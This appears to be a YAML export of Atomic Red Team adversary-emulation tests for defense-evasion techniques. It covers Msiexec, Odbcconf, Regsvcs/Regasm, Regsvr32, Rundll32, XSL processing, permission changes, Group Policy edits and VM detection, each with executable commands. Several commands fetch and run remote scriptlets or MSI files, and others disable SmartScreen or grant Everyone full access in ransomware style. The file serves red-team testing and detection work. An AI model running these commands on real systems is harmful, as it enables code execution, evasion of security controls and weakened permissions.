      command: Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\T1218.007\bin\T1218.007_EXE.msi' }
      timeout: 120
    - name: Msiexec.exe - Execute the DllRegisterServer function of a DLL
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /y "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll"
      timeout: 120
    - name: Msiexec.exe - Execute the DllUnregisterServer function of a DLL
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /z "PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll"
      timeout: 120
    - name: Msiexec.exe - Execute Remote MSI file
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/007
  is_safe: false
- id: T1218.008
  name: Odbcconf
  description: |-
    Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.

    Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Odbcconf.exe - Execute Arbitrary DLL
      type: cmd
      platform: windows
      command: odbcconf.exe /S /A {REGSVR "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"}
      timeout: 120
    - name: Odbcconf.exe - Load Response File
      type: cmd
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\T1218.008\bin\"
        odbcconf.exe -f "T1218.008.rsp"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/008
  is_safe: false
- id: T1218.009
  name: Regsvcs/Regasm
  description: |-
    Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

    Both utilities may be used to bypass application control through use of attributes within the binary to specify...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Regasm Uninstall Method Call Test
      type: cmd
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"%tmp%\T1218.009.dll" /target:library "PathToAtomicsFolder\T1218.009\src\T1218.009.cs"
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U %tmp%\T1218.009.dll
      cleanup: del %tmp%\T1218.009.dll >nul 2>&1
      timeout: 120
    - name: Regsvcs Uninstall Method Call Test
      type: powershell
      platform: windows
      command: |-
        $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
        $Content = [System.Convert]::FromBase64String($key)
        Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"$Env:TEMP\T1218.009.dll" /target:library /keyfile:$env:Temp\key.snk PathToAtomicsFolder\T1218.009\src\T1218.009.cs
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $Env:TEMP\T1218.009.dll
      cleanup: |-
        Remove-Item $Env:TEMP\T1218.009.dll -ErrorAction Ignore | Out-Null
        $parentpath = Split-Path -Path "$Env:TEMP\T1218.009.dll"
        Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
        Remove-Item $parentpath\T1218.009.tlb -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1218/009
  is_safe: false
- id: T1218.010
  name: Regsvr32
  description: |-
    Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

    Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allow...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Regsvr32 local COM scriptlet execution
      type: cmd
      platform: windows
      command: C:\Windows\system32\regsvr32.exe /s /u /i:"PathToAtomicsFolder\T1218.010\src\RegSvr32.sct" scrobj.dll
      timeout: 120
    - name: Regsvr32 remote COM scriptlet execution
      type: cmd
      platform: windows
      command: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
      timeout: 120
    - name: Regsvr32 local DLL execution
      type: cmd
      platform: windows
      command: IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll )
      timeout: 120
    - name: Regsvr32 Registering Non DLL
      type: cmd
      platform: windows
      command: C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
      cleanup: C:\Windows\system32\regsvr32.exe /U /s %temp%\shell32.jpg
      timeout: 120
    - name: Regsvr32 Silent DLL Install Call DllRegisterServer
      type: cmd
      platform: windows
      command: C:\Windows\system32\regsvr32.exe /s /i "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/010
  is_safe: false
- id: T1218.011
  name: Rundll32
  description: |-
    Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

    Rundll32.exe can also be used to e...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Rundll32 execute JavaScript Remote Payload With GetObject
      type: cmd
      platform: windows
      command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
      cleanup: taskkill /IM notepad.exe /f
      timeout: 120
    - name: Rundll32 execute VBscript command
      type: cmd
      platform: windows
      command: rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
      timeout: 120
    - name: Rundll32 execute VBscript command using Ordinal number
      type: cmd
      platform: windows
      command: rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
      timeout: 120
    - name: Rundll32 advpack.dll Execution
      type: cmd
      platform: windows
      command: rundll32.exe advpack.dll,LaunchINFSection "PathToAtomicsFolder\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,
      timeout: 120
    - name: Rundll32 ieadvpack.dll Execution
      type: cmd
      platform: windows
      command: rundll32.exe ieadvpack.dll,LaunchINFSection "PathToAtomicsFolder\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,
      timeout: 120
    - name: Rundll32 syssetup.dll Execution
      type: cmd
      platform: windows
      command: rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf"
      timeout: 120
    - name: Rundll32 setupapi.dll Execution
      type: cmd
      platform: windows
      command: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf"
      timeout: 120
    - name: Execution of HTA and VBS Files using Rundll32 and URL.dll
      type: cmd
      platform: windows
      command: |-
        rundll32.exe url.dll,OpenURL "PathToAtomicsFolder\T1218.011\src\index.hta"
        rundll32.exe URL.dll,FileProtocolHandler "PathToAtomicsFolder\T1218.011\src\akteullen.vbs"
      timeout: 120
    - name: Launches an executable using Rundll32 and pcwutl.dll
      type: cmd
      platform: windows
      command: rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe
      timeout: 120
    - name: Execution of non-dll using rundll32.exe
      type: powershell
      platform: windows
      command: rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW
      timeout: 120
    - name: Rundll32 with Ordinal Value
      type: cmd
      platform: windows
      command: rundll32.exe "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll",#2
      timeout: 120
    - name: Rundll32 with Control_RunDLL
      type: cmd
      platform: windows
      command: rundll32.exe shell32.dll,Control_RunDLL "PathToAtomicsFolder\T1047\bin\calc.dll"
      timeout: 120
    - name: Rundll32 with desk.cpl
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\calc.exe not_an_scr.scr
        rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
      cleanup: del not_an_scr.scr
      timeout: 120
    - name: Running DLL with .init extension and function
      type: cmd
      platform: windows
      command: rundll32.exe PathToAtomicsFolder\T1218.011\bin\_WT.init,krnl
      timeout: 120
    - name: Rundll32 execute command via FileProtocolHandler
      type: cmd
      platform: windows
      command: rundll32.exe url.dll,FileProtocolHandler calc.exe
      timeout: 120
    - name: Rundll32 execute payload by calling RouteTheCall
      type: powershell
      platform: windows
      command: rundll32.exe zipfldr.dll,RouteTheCall "'%windir%\System32\calc.exe'"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/011
  is_safe: false
- id: T1220
  name: XSL Script Processing
  description: |-
    Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

    Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing applicatio...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: MSXSL Bypass using local files
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe" "PathToAtomicsFolder\T1220\src\msxslxmlfile.xml" "PathToAtomicsFolder\T1220\src\msxslscript.xsl"'
      cleanup: del "PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe" >nul 2>&1
      timeout: 120
    - name: MSXSL Bypass using remote files
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"'
      cleanup: del -Path PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe >nul 2>&1
      timeout: 120
    - name: WMIC bypass using local XSL file
      type: cmd
      platform: windows
      command: wmic process list /FORMAT:"PathToAtomicsFolder\T1220\src\wmicscript.xsl"
      timeout: 120
    - name: WMIC bypass using remote XSL file
      type: cmd
      platform: windows
      command: wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1220
  is_safe: false
- id: T1221
  name: Template Injection
  description: Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsofts Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citati...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: WINWORD Remote Template Injection
      type: cmd
      platform: windows
      command: start "PathToAtomicsFolder\T1221\src\Calculator.docx"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1221
  is_safe: false
- id: T1222
  name: File and Directory Permissions Modification
  description: 'Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which acti...'
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Enable Local and Remote Symbolic Links via fsutil
      type: cmd
      platform: windows
      command: |-
        fsutil behavior set SymlinkEvaluation R2L:1
        fsutil behavior set SymlinkEvaluation R2R:1
      cleanup: |-
        fsutil behavior set SymlinkEvaluation R2L:0
        fsutil behavior set SymlinkEvaluation R2R:0
      timeout: 120
      elevation_required: true
    - name: Enable Local and Remote Symbolic Links via reg.exe
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "1" /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "1" /f
      cleanup: |-
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "0" /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "0" /f
      timeout: 120
      elevation_required: true
    - name: Enable Local and Remote Symbolic Links via Powershell
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
        New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
      cleanup: |-
        New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore
        New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1222
  is_safe: false
- id: T1222.001
  name: Windows File and Directory Permissions Modification
  description: 'Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which acti...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Take ownership using takeown utility
      type: cmd
      platform: windows
      command: takeown.exe /f %temp%\T1222.001_takeown_folder /r
      timeout: 120
    - name: cacls - Grant permission to specified user or group recursively
      type: cmd
      platform: windows
      command: icacls.exe %temp%\T1222.001_cacls /grant Everyone:F
      timeout: 120
    - name: attrib - Remove read-only attribute
      type: cmd
      platform: windows
      command: attrib.exe -r %temp%\T1222.001_attrib\*.* /s
      timeout: 120
    - name: attrib - hide file
      type: cmd
      platform: windows
      command: |-
        mkdir %temp%\T1222.001_attrib_2 >nul 2>&1
        echo T1222.001_attrib1 >> %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt
        echo T1222.001_attrib2 >> %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt
        attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt
        attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt
      cleanup: del /A:H %temp%\T1222.001_attrib_2\T1222.001_attrib*.txt >nul 2>&1
      timeout: 120
    - name: Grant Full Access to folder for Everyone - Ryuk Ransomware Style
      type: cmd
      platform: windows
      command: icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
      cleanup: icacls 'C:\Users\Public\*' /restore %temp%\T1222.001-folder-perms-backup.txt /q >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: SubInAcl Execution
      type: cmd
      platform: windows
      command: '"C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe"'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1222/001
  is_safe: false
- id: T1222.002
  name: Linux and Mac File and Directory Permissions Modification
  description: 'Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which acti...'
  tactic: defense-evasion
  platforms:
    - macos
    - linux
  executors:
    - name: chmod - Change file or folder mode (numeric mode)
      type: sh
      platform: linux
      command: chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (numeric mode)
      type: sh
      platform: macos
      command: chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (symbolic mode)
      type: sh
      platform: linux
      command: chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (symbolic mode)
      type: sh
      platform: macos
      command: chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (numeric mode) recursively
      type: sh
      platform: linux
      command: chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (numeric mode) recursively
      type: sh
      platform: macos
      command: chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (symbolic mode) recursively
      type: bash
      platform: linux
      command: chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chmod - Change file or folder mode (symbolic mode) recursively
      type: bash
      platform: macos
      command: chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chown - Change file or folder ownership and group
      type: bash
      platform: macos
      command: chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
      timeout: 60
    - name: chown - Change file or folder ownership and group
      type: bash
      platform: linux
      command: chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
      timeout: 60
    - name: chown - Change file or folder ownership and group recursively
      type: bash
      platform: macos
      command: chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chown - Change file or folder ownership and group recursively
      type: bash
      platform: linux
      command: chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chown - Change file or folder mode ownership only
      type: sh
      platform: linux
      command: chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
      timeout: 60
    - name: chown - Change file or folder mode ownership only
      type: sh
      platform: macos
      command: chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
      timeout: 60
    - name: chown - Change file or folder ownership recursively
      type: bash
      platform: macos
      command: chown -R root /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chown - Change file or folder ownership recursively
      type: bash
      platform: linux
      command: chown -R root /tmp/AtomicRedTeam/atomics/T1222.002
      timeout: 60
    - name: chattr - Remove immutable file attribute
      type: sh
      platform: macos
      command: chattr -i /var/spool/cron/root
      timeout: 60
    - name: chattr - Remove immutable file attribute
      type: sh
      platform: linux
      command: chattr -i /var/spool/cron/root
      timeout: 60
    - name: chflags - Remove immutable file attribute
      type: sh
      platform: linux
      command: |-
        touch /tmp/T1222.002.txt
        chflags simmutable /tmp/T1222.002.txt
        chflags nosimmutable /tmp/T1222.002.txt
      timeout: 60
    - name: Chmod through c script
      type: sh
      platform: macos
      command: /tmp/T1222002 /tmp/ T1222002
      timeout: 60
    - name: Chmod through c script
      type: sh
      platform: linux
      command: /tmp/T1222002 /tmp/ T1222002
      timeout: 60
    - name: Chmod through c script (freebsd)
      type: sh
      platform: linux
      command: /tmp/T1222002 /tmp/ T1222002
      timeout: 60
    - name: Chown through c script
      type: sh
      platform: macos
      command: sudo /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c
      timeout: 60
      elevation_required: true
    - name: Chown through c script
      type: sh
      platform: linux
      command: sudo /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c
      timeout: 60
      elevation_required: true
    - name: Chown through c script (freebsd)
      type: sh
      platform: linux
      command: /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1222/002
  is_safe: false
- id: T1484.001
  name: Group Policy Modification
  description: 'Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Pers...'
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: LockBit Black - Modify Group policy settings -cmd
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /t REG_SZ /d Block /f
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Modify Group policy settings -Powershell
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force
      cleanup: "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1484/001
  is_safe: false
- id: T1497.001
  name: System Checks
  description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversari...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Detect Virtualization Environment (Linux)
      type: sh
      platform: linux
      command: |-
        if (systemd-detect-virt) then echo "Virtualization Environment detected"; fi;
        if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo "Virtualization Environment detected"; fi;
      timeout: 60
      elevation_required: true
    - name: Detect Virtualization Environment (FreeBSD)
      type: sh
      platform: linux
      command: if [ "$(sysctl -n hw.hv_vendor)" != "" ]; then echo "Virtualization Environment detected"; fi
      timeout: 60
      elevation_required: true
    - name: Detect Virtualization Environment (Windows)
      type: powershell
      platform: windows
      command: |-
        $error.clear()
        Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
        if($error) {echo "Virtualization Environment detected"}
      cleanup: $error.clear()
      timeout: 120
    - name: Detect Virtualization Environment via ioreg
      type: sh
      platform: macos
      command: if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
      timeout: 60
    - name: Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)
      type: powershell
      platform: windows
      command: |-
        $Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"
        $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"
        if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
      timeout: 120
    - name: Detect Virtualization Environment using sysctl (hw.model)
      type: sh
      platform: macos
      command: if [ "$(sysctl -n hw.model | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
      timeout: 60
    - name: Check if System Integrity Protection is enabled
      type: sh
      platform: macos
      command: if [ "$(csrutil status | grep -v 'enabled')" != "" ]; then echo 'Possible Virtualization Environment detected'; fi;
      timeout: 60
    - name: Detect Virtualization Environment using system_profiler
      type: sh
      platform: macos
      command: if [ "$(system_profiler SPHardwareDataType | grep "Model Identifier" | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1497/001
  is_safe: false
- id: T1497.003
  name: Time Based Checks
